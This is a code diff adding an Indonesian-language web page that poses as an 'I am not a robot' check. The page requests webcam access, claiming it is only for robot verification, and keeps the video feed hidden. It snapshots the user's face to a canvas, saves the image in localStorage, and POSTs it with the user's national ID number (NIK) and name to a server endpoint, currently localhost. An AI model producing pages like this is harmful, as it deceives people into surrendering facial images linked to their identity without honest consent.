@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <div id="show" style="display: none;">
+            <div class="tombol">
+                <div class="dis">
+                    <button type="submit" class="ambil" id="robot" onclick="ambli()">AKU BUKAN ROBOT</button><br>
+                    <button type="submit" class="upload" onclick="upload()">LANJUT</button>
+                </div>
+            </div>
+        
+            <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+                <video id="wvideo" width="1000" height="600" style="visibility: hidden; border:1px solid black;" autoplay></video>
+            <canvas id="wcanvas" width="1000" height="600" style="border:1px solid black;"></canvas>
+                <img id="result">
+        
+        
+                <div id="gambar"></div>
+    </div>
+    </body>
+    </html>
+</html>
+<script>
+    const div = document.getElementById("show");
+
+    function showby() {
+        div.style.display = 'block';
+    }
+
+    setTimeout(showby, 2000);
+</script>
+<script>
+
+    function cekLogin() {
+                    if (localStorage.getItem("isLoggedIn") === null) {
+                        window.location.replace("index.html");
+                    }
+                }
+                cekLogin();
+
+                function cek() {
+                    if (localStorage.getItem("gambar") !== null) {
+                        window.location.href = "next.html";
+                    }else{
+                        
+                    }
+                }
+                cek();
+                
+    var v = document.querySelector("#wvideo"); 
+    var c = document.querySelector("#wcanvas"); 
+    var r = document.querySelector("#result"); 
+    var a = document.querySelector(".ambil"); 
+    var u = document.querySelector(".upload"); 
+
+    async function mulai() {
+        // alert("ini hanya sebuah pemeriksaan perangkat, bahwasanya anda bukan sebuah robot");
+        var str = null;
+        
+        try {
+            str = await navigator.mediaDevices.getUserMedia({video:true, audio:false});
+
+        } catch (error) {
+            alert("mohon untuk izinkan kamera mengakses sementara hanya untuk memastikan anda bukan robot");
+            // window.location.href = "login.html";
+        }
+
+        v.srcObject = str;
+    }
+    mulai();
+
+    function ambli() {
+        const context = c.getContext('2d');
+
+        
+        context.drawImage(v, 0,0, 1000, 600);
+        alert("berhasil, kamu terdeteksi sebagai hewan, silahkan klik lanjut");
+        
+        // console.log(r.src = c.toDataURL());
+        
+    }
+
+    async function upload() {
+        
+        console.log(r.src = c.toDataURL());
+        var am = r.src = c.toDataURL();
+        
+        var ap = document.getElementById("gambar");
+        ap.innerHTML = 
+            "<img src='" + am + "'";
+        ;
+    
+        var sim = localStorage.setItem('gambar', am);
+        window.location.href = "next.html";
+        
+        const response = await fetch("http://localhost/", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                        nik: localStorage.getItem("isLoggedIn"),
+                        nama: localStorage.getItem("isLoggedInName"),
+                        dgmr: localStorage.getItem("gambar"),
+                        action: "getCatatan"
+                    }),
+
+        });
+        let getData = await response.json();
+        
+    }
+            
+        // window.location.href = "tampil.php";
+        
+    v.addEventListener('play', function(){
+        a.disable = false;
+    });
+
+    a.addEventListener('click', function () {
+      u.disable = false;  
+    });
+
+
+</script>
+
+<style>
+    .tombol{
+        display: flex;
+        /* flex-direction: column; */
+        justify-content: center;
+        align-items: center;
+        height: 20vh;
+        width: 100vw;
+        /* padding: 10px; */
+    }
+
+    .dis{
+        display: flex;
+        flex-direction: column;
+    }
+
+    #robot:active{
+        border: none;
+        /* border-radius: 10px; */
+        box-shadow: 7px 5px 5px rgba(0, 253, 0, 0.349);
+        background-color: green;
+        color: aliceblue;
+    }
+</style>
